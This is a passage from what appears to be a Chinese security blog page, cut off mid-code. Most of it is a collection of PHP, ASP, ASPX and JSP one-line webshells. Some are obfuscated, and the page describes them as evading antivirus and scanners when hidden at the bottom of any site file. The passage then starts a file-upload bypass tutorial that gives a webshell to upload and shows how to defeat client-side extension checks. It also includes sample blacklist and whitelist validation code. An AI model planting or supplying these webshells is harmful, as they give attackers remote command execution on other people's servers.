punctuation\">,</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$array1</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token variable\">$func</span> <span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'func'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">array_filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">usort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'asse'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'rt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> php环境>=&lt;5.6才能用</pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">usort</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>  php环境>=5.6才能用</pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span>@<span class=\"token variable\">$_GET1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>@<span class=\"token variable\">$_</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>//容错代码 </pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[email]/e\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'h'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入*/:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>O</span><span class=\"token punctuation\">></span></span>h=@eval_r($_POST1);<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>O</span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token string backtick-quoted-string\">`$_GET['r']`</span> <span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">@<span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>sb<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span> //绕过<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>限制的一句话</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token function\">php </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system </span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre>加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！</pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>&lt;%execute request(“class”)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (“class”)%>&lt;%execute request(“class”)'&lt;% loop &lt;%:%> </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>无防下载表，有防下载表可尝试插入以下语句突破的一句话 </pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>&lt;%eval(request(“1″)):response.end%> 备份专用</pre></td></tr></table></figure><pre><code class=\"language-jsp\">##JSP：\n&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; \n提交客户端 \n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;\n</code></pre>\n<pre><code class=\"language-asp\">##ASP\n&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;\n\n&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; \n\n&lt;%execute(request(“1″))%&gt; \n\n&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用'&lt;,&gt;‘的asp一句话 \n</code></pre>\n<pre><code class=\"language-aspx\">##aspx\n&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; \n\n&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; \n\n&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。\n</code></pre>\n<h1 id=\"文件上传的攻击与防御方法\"><a class=\"anchor\" href=\"#文件上传的攻击与防御方法\">#</a> 文件上传的攻击与防御方法</h1>\n<h2 id=\"本地前端限制\"><a class=\"anchor\" href=\"#本地前端限制\">#</a> 本地前端限制</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">var</span> file <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> file <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请选择要上传的文件!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 定义允许上传的文件类型</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">var</span> allow_ext <span class=\"token operator\">=</span> <span class=\"token string\">\".jpg|.png|.gif\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 提取上传文件的类型</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">var</span> ext_name <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 判断上传文件类型是否允许上传</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>allow_ext<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>ext_name <span class=\"token operator\">+</span> <span class=\"token string\">\"|\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">var</span> errMsg <span class=\"token operator\">=</span> <span class=\"token string\">\"该文件不允许上传，请上传\"</span> <span class=\"token operator\">+</span> allow_ext <span class=\"token operator\">+</span> <span class=\"token string\">\"类型的文件,当前文件类型为：\"</span> <span class=\"token operator\">+</span> ext_name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>errMsg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>在表单中使用 onsumbit=checkFile () 调用 js 函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p>\n<h3 id=\"绕过方法\"><a class=\"anchor\" href=\"#绕过方法\">#</a> 绕过方法</h3>\n<p>这种限制很简单，通过浏览器 F12 很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是 JS 脚本检测，在本地浏览器客户端禁用 JS 即可。可使用火狐浏览器的 NoScript 插件、IE 中禁用掉 JS 等方式实现绕过。</p>\n<h3 id=\"操作方法\"><a class=\"anchor\" href=\"#操作方法\">#</a> 操作方法</h3>\n<p>准备一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>并且修改后缀名为 jpg，上传操作，通过 burpsuit 抓包改包，使其后缀名修改回 php。</p>\n<h2 id=\"服务器检测扩展名\"><a class=\"anchor\" href=\"#服务器检测扩展名\">#</a> 服务器检测扩展名</h2>\n<p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传<br />\n在检查扩展名是否合法的时候，有两种策略：</p>\n<h3 id=\"黑名单策略\"><a class=\"anchor\" href=\"#黑名单策略\">#</a> 黑名单策略</h3>\n<p>文件扩展名在黑名单中的为不合法</p>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.asp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.aspx'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.jsp'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">deldot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'::$DATA'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 收尾去空</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span>            </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                 <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"白名单策略\"><a class=\"anchor\" href=\"#白名单策略\">#</a> 白名单策略</h3>\n<p>文件扩展名不在白名单中的均为不合法</p>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$ext_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token 